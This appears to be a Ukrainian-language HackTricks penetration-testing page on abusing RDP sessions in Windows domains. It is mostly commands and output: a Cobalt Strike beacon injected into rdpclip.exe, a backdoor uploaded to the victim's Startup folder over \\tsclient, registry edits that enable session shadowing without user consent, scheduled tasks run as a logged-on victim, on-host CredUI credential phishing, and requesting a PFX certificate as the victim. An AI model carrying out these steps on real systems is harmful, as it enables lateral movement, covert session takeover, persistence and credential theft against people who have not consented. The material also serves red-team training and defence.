# Зловживання RDP-сесіями

{{#include ../../banners/hacktricks-training.md}}

## Ін'єкція процесів через RDP

Якщо **зовнішня група** має **RDP-доступ** до будь-якого **комп'ютера** в поточному домені, **attacker** може **скомпрометувати цей комп'ютер і чекати на нього**.

Після того як цей користувач увійде через RDP, **attacker може переміститися до сесії цього користувача** та зловживати його дозволами у зовнішньому домені.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Перевірте **інші способи крадіжки сесій за допомогою інших інструментів** [**на цій сторінці.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Якщо користувач отримує доступ через **RDP до машини**, де на нього **очікує** **attacker**, attacker зможе **інжектити beacon у RDP-сесію користувача**, а якщо **victim підключив свій диск** під час доступу через RDP, **attacker зможе отримати до нього доступ**.

У цьому випадку можна просто **скомпрометувати** **оригінальний комп'ютер** **victim**, записавши **backdoor** у **папку автозапуску**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Якщо ви є **local admin** на хості, де жертва вже має **active RDP session**, ви можете **переглядати/контролювати цей робочий стіл без викрадення пароля або дампу LSASS**.<sup>[[1]](#references)</sup>

Це залежить від політики **Remote Desktop Services shadowing**, що зберігається в:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Цікаві значення:

- `0`: Вимкнено
- `1`: `EnableInputNotify` (керування, потрібне підтвердження користувача)
- `2`: `EnableInputNoNotify` (керування, **без підтвердження користувача**)
- `3`: `EnableNoInputNotify` (лише перегляд, потрібне підтвердження користувача)
- `4`: `EnableNoInputNoNotify` (лише перегляд, **без підтвердження користувача**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Це особливо корисно, коли привілейований користувач, підключений через RDP, залишив незаблокований робочий стіл, сеанс KeePass, консоль MMC, сеанс браузера або відкриту admin shell.

## Scheduled Tasks As Logged-On User

Якщо ви є **local admin**, а цільовий користувач **зараз увійшов у систему**, Task Scheduler може запустити code **від імені цього користувача без його пароля**.<sup>[[1]](#references)[[4]](#references)</sup>

Це перетворює наявний сеанс входу жертви на примітив виконання:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Нотатки:

- Якщо користувач **не ввійшов у систему**, Windows зазвичай вимагає пароль для створення завдання, яке виконуватиметься від його імені.
- Якщо користувач **вже ввійшов у систему**, завдання може повторно використати наявний контекст входу.
- Це практичний спосіб виконувати дії GUI або запускати бінарні файли всередині сесії жертви без взаємодії з LSASS.

## Зловживання CredUI Prompt із сесії жертви

Якщо ви можете виконувати код **усередині інтерактивного робочого столу жертви** (наприклад, через **Shadow RDP** або **заплановане завдання, що виконується від імені цього користувача**), ви можете відобразити **справжній запит облікових даних Windows** за допомогою API CredUI та отримати облікові дані, введені жертвою.<sup>[[1]](#references)</sup>

Відповідні API:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Типовий процес:

1. Запустити бінарний файл у сесії жертви.
2. Відобразити запит автентифікації домену, що відповідає брендингу поточного домену.
3. Розпакувати отриманий буфер автентифікації.
4. Перевірити надані облікові дані та, за потреби, продовжувати показ запиту, доки не буде введено дійсні облікові дані.

Це корисно для **фішингу на хості**, оскільки запит відображається стандартними API Windows, а не підробленою HTML-формою.

## Запит PFX у контексті жертви

Той самий примітив **запланованого завдання від імені користувача** можна використати для запиту **сертифіката/PFX від імені жертви, яка ввійшла в систему**. Пізніше цей сертифікат можна використати для **автентифікації в AD** як цей користувач, повністю уникаючи викрадення пароля.<sup>[[1]](#references)[[5]](#references)</sup>

Процес на високому рівні:

1. Отримати права **локального адміністратора** на хості, де жертва ввійшла в систему.
2. Виконати логіку отримання/експорту від імені жертви за допомогою **запланованого завдання**.
3. Експортувати отриманий **PFX**.
4. Використати PFX для PKINIT / автентифікації в AD на основі сертифіката.

Див. сторінки AD CS для подальшого зловживання:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Посилання

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
